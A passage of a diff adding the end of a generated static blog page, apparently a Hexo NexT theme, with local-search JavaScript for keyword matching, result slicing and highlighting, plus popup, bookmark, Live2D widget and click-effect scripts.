+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+  
+  <script src="/lib/bookmark/bookmark.min.js?v=1.0"></script>
+  <script>
+  
+    bookmark.scrollToMark('auto', "#更多");
+  
+  </script>
+
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":250,"height":500},"mobile":{"show":false},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/clicklove.js"></script>
